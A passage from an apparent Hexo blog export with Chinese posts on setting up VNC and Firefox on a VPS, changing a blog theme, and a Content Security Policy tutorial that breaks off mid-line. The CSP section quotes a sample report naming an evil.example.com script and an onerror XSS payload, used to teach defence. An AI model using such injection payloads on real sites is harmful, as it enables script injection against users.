class="line">[root@localhost ~]# yum install vnc vnc-server  (适用CentOS 5)</span><br><span class="line">[root@localhost ~]# yum install tigervnc-server  (适用CentOS 6)</span><br><span class="line"> </span><br><span class="line">向/etc/sysconfig/vncservers里写入两行内容，懒人可以直接用如下命令写入：</span><br><span class="line">[root@localhost ~]# echo 'VNCSERVERS="1:root"' &gt;&gt; /etc/sysconfig/vncservers</span><br><span class="line">[root@localhost ~]# echo 'VNCSERVERARGS[1]="-geometry 1024x768"' &gt;&gt; /etc/sysconfig/vncservers</span><br><span class="line"> </span><br><span class="line">首次启动，会要求输入两遍密码</span><br><span class="line">[root@localhost ~]# vncserver</span><br><span class="line"> </span><br><span class="line">修改密码用此命令</span><br><span class="line">[root@localhost ~]# vncpasswd</span><br><span class="line"> </span><br><span class="line">如果安装的是Gnome，把~/.vnc/xstartup最后一行twm替换为gnome-session，懒人请执行以下语句替换</span><br><span class="line">[root@localhost ~]# sed -i 's/twm/gnome-session/g' ~/.vnc/xstartup</span><br><span class="line"> </span><br><span class="line">如果安装的是xfce，则执行如下语句：</span><br><span class="line">[root@localhost ~]# mv ~/.vnc/xstartup ~/.vnc/xstartup.bak</span><br><span class="line">[root@localhost ~]# echo '#!/bin/sh' &gt;&gt; ~/.vnc/xstartup</span><br><span class="line">[root@localhost ~]# echo '/usr/bin/startxfce4' &gt;&gt; ~/.vnc/xstartup</span><br><span class="line"> </span><br><span class="line">给予权限，设置开机自启动等：</span><br><span class="line">[root@localhost ~]# chmod +x ~/.vnc/xstartup</span><br><span class="line">[root@localhost ~]# service vncserver restart</span><br><span class="line">重启服务时这里可能会提示 A VNC server is already running as :1 [FAILED]的错误，解决方法见下。</span><br><span class="line">[root@localhost ~]# chkconfig vncserver on</span><br><span class="line"></span><br><span class="line">ln -s /etc/init.d/vncserver /etc/rc.d/rc3.d/S100vncserver</span><br></pre></td></tr></table></figure><p>同样的，在过程中有一次我们看到”Is this ok [y/n]”我们只需要输入y且回车就可以。</p><p>要在windows系统里连接远程VNCServer，你还需要一个VNC-Viewer，<a href="http://www.realvnc.com/download/binary/1731/">下载地址</a>。连接方法：你的ip:1</p><p>如果在连接的时候出现“connect: Connect refused (10061)”的错误，在服务端执行vncserver，再次重新连接，就OK了。<br>在一些minimal系统里，即使英文也会出现方框乱码，请使用命令修正：yum install fontforge</p><h3 id="VNCServer使用方法"><a href="#VNCServer使用方法" class="headerlink" title="VNCServer使用方法"></a>VNCServer使用方法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# vncserver :1    启动:1</span><br><span class="line">[root@localhost ~]# vncserver :2    启动:2</span><br><span class="line">[root@localhost ~]# ps -ef|grep -i xvnc   查看已启动的server</span><br><span class="line">[root@localhost ~]# vncserver -kill :1    杀死:1</span><br></pre></td></tr></table></figure><p>今天在使用VNCServer的时候，遇到些问题，下面简单记录一下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@os1 ~]# service vncserver restart</span><br><span class="line">Shutting down VNC server: 1:root                           [FAILED]</span><br><span class="line">Starting VNC server: 1:root A VNC server is already running as :1</span><br><span class="line">                                                           [FAILED]</span><br><span class="line">```                                                          </span><br><span class="line">故障原因：/etc/hosts与/etc/sysconfig/network文件中的hostname不一致。</span><br><span class="line">一般改掉/etc/hosts中的hostname，再重启vncserver就好了。</span><br><span class="line">```shell</span><br><span class="line">[root@os1 ~]# vncserver</span><br><span class="line">xauth: (stdin):1:  bad display name "os1:4" in "add" command</span><br><span class="line">故障原因：原因同上。</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">添加开机服务 首先需要要执行的脚本在/etc/init.d/目录下</span></span><br><span class="line">update-rc.d tightvncserver:1 defaults</span><br><span class="line"><span class="meta">#</span><span class="bash">移除该开机服务</span></span><br><span class="line">update-rc.d -f xxx remove</span><br></pre></td></tr></table></figure><h2 id="安装FireFox浏览器"><a href="#安装FireFox浏览器" class="headerlink" title="安装FireFox浏览器"></a>安装FireFox浏览器</h2><p><a href="http://ftp.mozilla.org/pub/firefox/">FTP</a></p><p>下载firefox releases</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;ftp.mozilla.org&#x2F;pub&#x2F;firefox&#x2F;releases&#x2F;3.6.28&#x2F;linux-i686&#x2F;en-US&#x2F;firefox-3.6.28.tar.bz2</span><br><span class="line">bzip2 -d firefox-3.6.28.tar.bz2</span><br><span class="line">tar -xvf firefox-3.6.28.tar</span><br><span class="line"></span><br><span class="line">wget http:&#x2F;&#x2F;ftp.mozilla.org&#x2F;pub&#x2F;firefox&#x2F;releases&#x2F;38.0.1esr&#x2F;linux-x86_64&#x2F;en-US&#x2F;firefox-38.0.1esr.tar.bz2</span><br><span class="line">bzip2 -d firefox-38.0.1esr.tar.bz2</span><br><span class="line">tar -xvf firefox-38.0.1esr.tar</span><br><span class="line"></span><br><span class="line">mv firefox &#x2F;usr&#x2F;local</span><br><span class="line">chown -R root:root &#x2F;usr&#x2F;local&#x2F;firefox</span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;bin</span><br><span class="line">ln -s ..&#x2F;firefox&#x2F;firefox</span><br><span class="line"></span><br><span class="line">$ cd &#x2F;usr&#x2F;local</span><br><span class="line">$ sudo mv firefox firefox-old  #将来的命名为firefox-old</span><br><span class="line">$ sudo mv &#x2F;root&#x2F;firefox firefox-new  #将解压的firefox目录移动到&#x2F;usr&#x2F;lib路径下</span><br><span class="line">$ sudo ln -s firefox-new firefox</span><br><span class="line"></span><br><span class="line">#用type查看firefox命令</span><br><span class="line">type firefox</span><br><span class="line"></span><br><span class="line">yum update</span><br><span class="line">yum whatprovides libgtk-x11-2.0.so.0</span><br><span class="line">yum install gtk2-2.24.23-6.el6.i686</span><br><span class="line">yum whatprovides libXt.so.6</span><br><span class="line">yum install libXt-1.1.4-6.1.el6.i686</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wget http:&#x2F;&#x2F;ftp.mozilla.org&#x2F;pub&#x2F;firefox&#x2F;releases&#x2F;32.0&#x2F;linux-i686&#x2F;en-US&#x2F;firefox-32.0.tar.bz2</span><br><span class="line">tar xjf firefox-32.0.tar.bz2</span><br><span class="line">mv firefox&#x2F; &#x2F;usr&#x2F;local&#x2F;lib&#x2F;</span><br><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;lib&#x2F;firefox&#x2F;firefox &#x2F;usr&#x2F;bin&#x2F;firefox</span><br><span class="line">##安装flash插件</span><br><span class="line">wget http:&#x2F;&#x2F;vagex-debian.googlecode.com&#x2F;files&#x2F;libflashplayer.so</span><br><span class="line">mkdir -p &#x2F;usr&#x2F;local&#x2F;lib&#x2F;firefox&#x2F;plugins</span><br><span class="line">mv libflashplayer.so &#x2F;usr&#x2F;local&#x2F;lib&#x2F;firefox&#x2F;plugins&#x2F;</span><br></pre></td></tr></table></figure><p>或者<br>下载firefox 3.6.28源码包，并编译安装（编译过程非常缓存，建议screen里执行）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install bzip2</span><br><span class="line">wget http://ftp.mozilla安装flash插件</span><br><span class="line"></span><br><span class="line">.org/pub/firefox/releases/3.6.28/source/firefox-3.6.28.source.tar.bz2</span><br><span class="line">bzip2 -d firefox-3.6.28.source.tar.bz2</span><br><span class="line">tar -xvf firefox-3.6.28.source.tar</span><br><span class="line">cd mozilla-*</span><br><span class="line">yum install gcc-c++</span><br><span class="line">yum install gtk+-devel</span><br><span class="line"> export PKG_CONFIG=/usr/local/bin/pkg-config</span><br><span class="line"> export PKG_CONFIG_PATH=/usr/share/pkgconfig:/usr/lib64/pkgconfig</span><br><span class="line">  echo $PKG_CONFIG_PATH</span><br><span class="line">vi /etc/ld.so.conf</span><br><span class="line"><span class="meta">#</span><span class="bash">比如将当前路径作为lib链接默认搜索路径,</span></span><br><span class="line">include /etc/ld.so.conf.d/*.conf</span><br><span class="line">include /usr/local/lib</span><br><span class="line">include .</span><br><span class="line">ldconfig</span><br><span class="line"></span><br><span class="line">./configure --enable-application=browser &amp;&amp; make &amp;&amp; make install</span><br><span class="line"><span class="meta">#</span><span class="bash">./configure --prefix=PREFIX  </span></span><br><span class="line"><span class="meta">#</span><span class="bash">其中--prefix=PREFIX是指定安装目录，你需要将PREFIX替换为你的目录</span></span><br><span class="line"></span><br><span class="line">make -f client.mk build</span><br><span class="line">make -f client.mk install</span><br><span class="line"><span class="meta">#</span><span class="bash">mozilla/dist/bin</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rm -rf mozilla-*</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install firefox</span><br><span class="line">yum -y install fonts-chinese (可选，简体中文)</span><br></pre></td></tr></table></figure><p>安装flash-plugin源</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://linuxdownload.adobe.com/adobe-release/adobe-release-x86_64-1.0-1.noarch.rpm</span><br><span class="line">rpm -ivh adobe-release-x86_64-1.0-1.noarch.rpm</span><br><span class="line">yum install flash-plugin</span><br></pre></td></tr></table></figure><p>禁用Firefox的历史记录保存功能：打开Firefox浏览器Edit→Preferences→Privacy，在Firefox will后面的框里选Never remember history。</p><p>设置Linux VPS定时关机并自动重启和删除Log文件以释放内存和硬盘。</p><p>执行下列命令，打开计划任务编辑。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /var/spool/cron/root</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 按下字母 i 进入编辑模式，复制以下代码，然后按下键盘上的esc键，再输入:wq 回车，就会保存退出。代码的作用是让VPS每隔三个小时重启一次。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00 00 * * * rm -rf /root/.vnc/*.log</span><br><span class="line">01 00 * * * reboot</span><br><span class="line">00 03 * * * rm -rf /root/.vnc/*.log</span><br><span class="line">01 03 * * * reboot</span><br><span class="line">00 06 * * * rm -rf /root/.vnc/*.log</span><br><span class="line">01 06 * * * reboot</span><br><span class="line">00 09 * * * rm -rf /root/.vnc/*.log</span><br><span class="line">01 09 * * * reboot</span><br><span class="line">00 12 * * * rm -rf /root/.vnc/*.log</span><br><span class="line">01 12 * * * reboot</span><br><span class="line">00 15 * * * rm -rf /root/.vnc/*.log</span><br><span class="line">01 15 * * * reboot</span><br><span class="line">00 18 * * * rm -rf /root/.vnc/*.log</span><br><span class="line">01 18 * * * reboot</span><br><span class="line">00 21 * * * rm -rf /root/.vnc/*.log</span><br><span class="line">01 21 * * * reboot</span><br></pre></td></tr></table></figure><p>vi /etc/rc.d/rc.local</p><p>定时重启firefox<br>首先在root目录下新建一个重启脚本vncrestart_tennfy.sh，执行以下命令即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;- EOF &gt;&gt; /root/vncrestart_tennfy.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">export DISPLAY=localhost:1.0</span><br><span class="line">rm -rf ~/.vnc/*.log /tmp/plugtmp* &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">killall firefox  &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">/usr/bin/firefox &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">加了一个5分钟检测一次的脚本，只要不firefox关闭，或者内存大于650(768m的vps)，就重启firefox；</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">export DISPLAY=localhost:1.0</span><br><span class="line">USEDNC=$(free -m | awk ‘NR==2′ | awk ‘&#123;print $3&#125;’)</span><br><span class="line">FIRE=$(pgrep firefox)</span><br><span class="line">if [ -z "$FIRE" ] || [ $USEDNC -ge 650 ]</span><br><span class="line">then</span><br><span class="line">rm -rf ~/.vnc/*.log /tmp/plugtmp* &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">killall firefox &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">/usr/bin/firefox &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 给脚本添加可执行权限</span></span><br><span class="line"></span><br><span class="line">chmod a+x /root/vncrestart_tennfy.sh</span><br><span class="line"></span><br><span class="line">echo "0 * * * * root /root/vncrestart_tennfy.sh" &gt;&gt;/etc/crontab</span><br><span class="line">/etc/init.d/cron restart</span><br></pre></td></tr></table></figure><p>Autostarted applications</p><p>在弹出的对话框中点击Add，在name中输入firefox，Description不用输入，Command中输入firefox。</p><p>重启后firefox显示offline mode的解决办法</p><p>在firefox地址栏中输入about:config</p><p>搜索这个选项</p><p>network.manage-offline-status</p><p>改成 “false”</p><p>搜索这个选项</p><p>toolkit.networkmanager.disable</p><p>改成”true”</p><p>搜索这个选项</p><p>browser.offline-apps.notify</p><p>改成 “false”</p><p>重新启动firefox，随便输入网址看看能否连接网络。</p><p>如果还不行的话，检查一下dns是否设置正确。可以在终端中ping下某个ip地址，如果ping的通，但是ping域名ping不通的话，就意味着你的vps的dns没有设置。</p><p>需要找到这个位置的文件</p><p>/etc/resolv.conf</p><p>鼠标右键选择open with leafpad，进入后在下面添加</p><p>nameserver 8.8.8.8</p><p>nameserver 8.8.4.4</p><p>保存后就可以了。</p><p>首先在FireFox地址栏输入：about:config<br>回车后会有个警告，不理会它，确认后进入节目设置界面。<br>接着在过滤器中输入 browser.sessionstore 方便查找。<br>然后将以下三项对于以下内容修改：</p><p>browser.sessionstore.max_tabs_undo 的值改为0（把非法关闭后保存的Tab页数改为0）<br>browser.sessionstore.max_windows_undo 的值改为0（把保存的窗口数改为0）<br>browser.sessionstore.resume_from_crash 设为false（禁用恢复会话功能）</p><p>最后关闭 about:config 页，重启FireFox。</p><pre><code>现在可以测试下，打开FireFox，随便打开几个网页，再用任务管理器结束 FireFox 进程，再自己启动FireFox，应该看不到那恢复会话窗口了:)</code></pre><p>另外有Debian安装LXDE<br><a href="http://www.laozuo.org/2932.html">Linux VPS Debian安装LXDE+VNC桌面 附配Firefox浏览器及简体中文</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/rc.local</span><br><span class="line"><span class="meta">#</span><span class="bash">在“<span class="built_in">exit</span> 0”上边添加：</span></span><br><span class="line"><span class="meta">#</span><span class="bash">vnc4server</span></span><br><span class="line">su root -c "/usr/bin/vncserver -geometry 1024x768"</span><br><span class="line"><span class="meta">#</span><span class="bash">tightvnc</span></span><br><span class="line">su root -c "/usr/bin/tightvncserver -geometry 1024x768"</span><br><span class="line"><span class="meta">#</span><span class="bash">如果需要自定义的端口，可以在分辨率参数后加入“-rfbport 5902”，其中5902可以改为你需要的端口。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">LXDE下设置开机启动的方法</span></span><br><span class="line">vi /etc/xdg/lxsession/LXDE/autostart</span><br><span class="line">@firefox-esr</span><br></pre></td></tr></table></figure><h2 id="安装及卸载wine"><a href="#安装及卸载wine" class="headerlink" title="安装及卸载wine"></a>安装及卸载wine</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install wine</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">yum remove wine</span><br><span class="line">yum remove wine-common</span><br><span class="line">yum remove wine-core</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">查看当前系统中安装的所有的软件包</span></span><br><span class="line">rpm -q -a|grep wine</span><br><span class="line">rpm -a [package name] </span><br><span class="line"><span class="meta">#</span><span class="bash"> 卸载软件忽略依赖关系</span></span><br><span class="line">rpm -e [package name] -nodeps</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>vps</tag>
      </tags>
  </entry>
  <entry>
    <title>更换个国内Hexo主题</title>
    <url>/2015/02/10/change-themes/</url>
    <content><![CDATA[<h1 id="更换了Hexo主题为coney"><a href="#更换了Hexo主题为coney" class="headerlink" title="更换了Hexo主题为coney"></a>更换了Hexo主题为coney</h1><hr><p>本来在自带主题上修改，后来想想，还是找个其他主题看看吧。然后找到了coney，专为国内修改。已添加了百度分享，百度搜索，百度分析，回到页首等等。<br>这样我在改改就可以直接用了。</p><a id="more"></a><p>然后，让我来试试Hexo的分类和标签功能先。</p><p>2015-12-01 update<br>添加简繁体切换，<a href="http://www.arao.me/2015/hexo-support-jian-fan-language/#more">原文摸这里</a></p><p>具体实现：</p><ul><li>首先，<a href="/js/tw_cn.js">点击这里</a>右键另存下载简繁字体切换所需的<code>tw_cn.js</code>文件，上传到自己的网站空间。</li><li>其次，修改模板，在你想要显示简繁转换按钮的地方加上下面一段代码，正常情况添加到<code>footer.ejs</code>或者<code>sidebar.ejs</code>就可以了。<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"translateLink"</span> <span class="attr">href</span>=<span class="string">"javascript:translatePage();"</span>&gt;</span>繁体<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li>最后，在<code>footer.ejs</code>添加下面代码，记得更改<code>cookieDomain</code>这一项。<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"http://blog.yanzhe.tk/js/tw_cn.js"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">    &lt;script type="text/</span>javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    var defaultEncoding = 2; //网站编写字体是否繁体，1-繁体，2-简体</span></span><br><span class="line"><span class="string">    var translateDelay = 0; //延迟时间,若不在前, 要设定延迟翻译时间, 如100表示100ms,默认为0</span></span><br><span class="line"><span class="string">    var cookieDomain = "</span>http:<span class="comment">//blog.yanzhe.tk/"; //Cookie地址, 一定要设定, 通常为你的网址</span></span><br><span class="line">    <span class="keyword">var</span> msgToTraditionalChinese = <span class="string">"繁体"</span>; <span class="comment">//此处可以更改为你想要显示的文字</span></span><br><span class="line">    <span class="keyword">var</span> msgToSimplifiedChinese = <span class="string">"简体"</span>; <span class="comment">//同上，但两处均不建议更改</span></span><br><span class="line">    <span class="keyword">var</span> translateButtonId = <span class="string">"translateLink"</span>; <span class="comment">//默认互换id</span></span><br><span class="line">    translateInitilization();</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>这就基本完成了简体繁体切换功能,不管你是hexo，jelly，Octopress等静态博客，还是wordpress，typecho，emlog，Z-Blog等动态的，都可以用上。具体的演示效果可以点击我博客底部简体中文切换字体,至于简体繁体切换按钮嘛，文字和样式可以按个人喜好自行更改。</p>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Content Security Policy 入门教程</title>
    <url>/2017/02/27/content-security-policy/</url>
    <content><![CDATA[<p>跨域脚本攻击 XSS(Cross Site Scripting) 是最常见、危害最大的网页安全漏洞。</p><p>为了防止它们，要采取很多编程措施，非常麻烦。很多人提出，能不能根本上解决问题，浏览器自动禁止外部注入恶意脚本？</p><p>这就是”网页安全政策”（Content Security Policy，缩写 CSP）的来历。本文详细介绍如何使用 CSP 防止 XSS 攻击。</p><a id="more"></a><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。<br>CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。<br>两种方法可以启用 CSP。一种是通过 HTTP 头信息的<code>Content-Security-Policy</code>的字段。<br><img alt="CSP示例" data-src="Content-Security-Policy-Example.jpg"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">'self'</span>; object-src <span class="string">'none'</span>;</span><br><span class="line">style-src cdn.example.org third-party.org; child-src https:</span><br></pre></td></tr></table></figure><p>另一种是通过网页的<code>&lt;meta&gt;</code>标签</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面代码中，CSP 做了如下配置。</p><ul><li>脚本：只信任当前域名</li><li><object>标签：不信任任何URL，即不加载任何资源</object></li><li>样式表：只信任cdn.example.org和third-party.org</li><li>框架（frame）：必须使用HTTPS协议加载</li><li>其他资源：没有限制</li></ul><p>启用后，不符合 CSP 的外部资源就会被阻止加载。<br>Chrome 的报错信息。</p><p><img alt="CSP Chrome 报错信息" data-src="CSP-chrome-err.png"></p><p>Firefox 的报错信息。</p><p><img alt="CSP Firefox 报错信息" data-src="CSP-firefox-err.png"></p><h2 id="限制选项"><a href="#限制选项" class="headerlink" title="限制选项"></a>限制选项</h2><p>CSP 提供了很多限制选项，涉及安全的各个方面。</p><h3 id="资源加载限制"><a href="#资源加载限制" class="headerlink" title="资源加载限制"></a>资源加载限制</h3><p>以下选项限制各类资源的加载。</p><ul><li>script-src：外部脚本</li><li>style-src：样式表</li><li>img-src：图像</li><li>media-src：媒体文件（音频和视频）</li><li>font-src：字体文件</li><li>object-src：插件（比如 Flash）</li><li>child-src：框架</li><li>frame-ancestors：嵌入的外部资源（比如<frame>、<iframe>、<embed>和<applet>）</applet></iframe></li><li>connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）</li><li>worker-src：worker脚本</li><li>manifest-src：manifest 文件</li></ul><h3 id="defualt-src"><a href="#defualt-src" class="headerlink" title="defualt-src"></a>defualt-src</h3><p><code>default-src</code>用来设置上面各个选项的默认值。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: <span class="keyword">default</span>-src <span class="string">'self'</span></span><br></pre></td></tr></table></figure><p>上面代码限制<strong>所有的</strong>外部资源，都只能从当前域名加载。<br>如果同时设置某个单项限制（比如<code>font-src</code>）和<code>default-src</code>，前者会覆盖后者，即字体文件会采用<code>font-src</code>的值，其他资源依然采用<code>default-src</code>的值。</p><h3 id="URL限制"><a href="#URL限制" class="headerlink" title="URL限制"></a>URL限制</h3><p>有时，网页会跟其他 URL 发生联系，这时也可以加以限制。</p><ul><li>frame-ancestors：限制嵌入框架的网页</li><li>base-uri：限制&lt;base#href&gt;</li><li>form-action：限制&lt;form#action&gt;</li></ul><h3 id="其他限制"><a href="#其他限制" class="headerlink" title="其他限制"></a>其他限制</h3><p>其他一些安全相关的功能，也放在了 CSP 里面。</p><ul><li>block-all-mixed-content：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</li><li>upgrade-insecure-requests：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</li><li>plugin-types：限制可以使用的插件格式</li><li>sandbox：浏览器行为的限制，比如不能有弹出窗口等。</li></ul><h3 id="report-uri"><a href="#report-uri" class="headerlink" title="report-uri"></a>report-uri</h3><p>有时，我们不仅希望防止 XSS，还希望记录此类行为。<code>report-uri</code>就用来告诉浏览器，应该把注入行为报告给哪个网址。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: <span class="keyword">default</span>-src <span class="string">'self'</span>; ...; report-uri /my_amazing_csp_report_parser;</span><br></pre></td></tr></table></figure><p>上面代码指定，将注入行为报告给<code>/my_amazing_csp_report_parser</code>这个 URL。<br>浏览器会使用<code>POST</code>方法，发送一个JSON对象，下面是一个例子。</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"csp-report"</span>: &#123;</span><br><span class="line">    <span class="attr">"document-uri"</span>: <span class="string">"http://example.org/page.html"</span>,</span><br><span class="line">    <span class="attr">"referrer"</span>: <span class="string">"http://evil.example.com/"</span>,</span><br><span class="line">    <span class="attr">"blocked-uri"</span>: <span class="string">"http://evil.example.com/evil.js"</span>,</span><br><span class="line">    <span class="attr">"violated-directive"</span>: <span class="string">"script-src 'self' https://apis.google.com"</span>,</span><br><span class="line">    <span class="attr">"original-policy"</span>: <span class="string">"script-src 'self' https://apis.google.com; report-uri http://example.org/my_amazing_csp_report_parser"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img alt="CSP report uri" data-src="CSP-report-uri.png"></p><h2 id="Content-Security-Policy-Report-Only"><a href="#Content-Security-Policy-Report-Only" class="headerlink" title="Content-Security-Policy-Report-Only"></a>Content-Security-Policy-Report-Only</h2><p>除了<code>Content-Security-Policy</code>，还有一个<code>Content-Security-Policy-Report-Only</code>字段，表示不执行限制选项，只是记录违反限制的行为。<br>它必须与<code>report-uri</code>选项配合使用。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy-Report-Only: <span class="keyword">default</span>-src <span class="string">'self'</span>; ...; report-uri /my_amazing_csp_report_parser;</span><br></pre></td></tr></table></figure><h2 id="选项值"><a href="#选项值" class="headerlink" title="选项值"></a>选项值</h2><p>每个限制选项可以设置以下几种值，这些值就构成了白名单。</p><ul><li>主机名：example.org，<a href="https://example.com:443">https://example.com:443</a></li><li>路径名：example.org/resources/js/</li><li>通配符：<em>.example.org，</em>://<em>.example.com:</em>（表示任意协议、任意子域名、任意端口）</li><li>协议名：https:、data:</li><li>关键字’self’：当前域名，需要加引号</li><li>关键字’none’：禁止加载任何外部资源，需要加引号</li></ul><p>多个值也可以并列，用空格分隔。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">'self'</span> https:<span class="comment">//apis.google.com</span></span><br></pre></td></tr></table></figure><p>如果同一个限制选项使用多次，只有第一次会生效。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># 错误的写法</span><br><span class="line">script-src https:<span class="comment">//host1.com; script-src https://host2.com</span></span><br><span class="line"></span><br><span class="line"># 正确的写法</span><br><span class="line">script-src https:<span class="comment">//host1.com https://host2.com</span></span><br></pre></td></tr></table></figure><p>如果不设置某个限制选项，就是默认允许任何值。</p><h2 id="script-src-的特殊值"><a href="#script-src-的特殊值" class="headerlink" title="script-src 的特殊值"></a>script-src 的特殊值</h2><p>除了常规值，<code>script-src</code>还可以设置一些特殊值。注意，下面这些值都必须放在单引号里面。</p><ul><li>‘unsafe-inline’：允许执行页面内嵌的&lt;script&gt;标签和事件监听函数</li><li>unsafe-eval：允许将字符串当作代码执行，比如使用eval、setTimeout、setInterval和Function等函数。</li><li>nonce值：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行</li><li>hash值：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。</li></ul><p>nonce值的例子如下，服务器发送网页的时候，告诉浏览器一个随机生成的token。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">'nonce-EDNnf03nceIOfn39fn3e9h3sdfa'</span></span><br></pre></td></tr></table></figure><p>页面内嵌脚本，必须有这个token才能执行。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">EDNnf03nceIOfn39fn3e9h3sdfa</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="comment">// some code</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>hash值的例子如下，服务器给出一个允许执行的代码的hash值。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">'sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng='</span></span><br></pre></td></tr></table></figure><p>下面的代码就会允许执行，因为hash值相符。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'Hello, world.'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意，计算hash值的时候，<code>&lt;script&gt;</code>标签不算在内。<br>除了<code>script-src</code>选项，nonce值和hash值还可以用在<code>style-src</code>选项，控制页面内嵌的样式表。</p><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><h3 id="script-src和object-src是必设的，除非设置了default-src。"><a href="#script-src和object-src是必设的，除非设置了default-src。" class="headerlink" title="script-src和object-src是必设的，除非设置了default-src。"></a><code>script-src</code>和<code>object-src</code>是必设的，除非设置了<code>default-src</code>。</h3><p>因为攻击者只要能注入脚本，其他限制都可以规避。而<code>object-src</code>必设是因为 Flash 里面可以执行外部脚本。</p><h3 id="script-src不能使用unsafe-inline关键字（除非伴随一个nonce值），也不能允许设置data-URL。"><a href="#script-src不能使用unsafe-inline关键字（除非伴随一个nonce值），也不能允许设置data-URL。" class="headerlink" title="script-src不能使用unsafe-inline关键字（除非伴随一个nonce值），也不能允许设置data:URL。"></a><code>script-src</code>不能使用<code>unsafe-inline</code>关键字（除非伴随一个nonce值），也不能允许设置<code>data</code>:URL。</h3><p>下面是两个恶意攻击的例子。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">"evil()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span 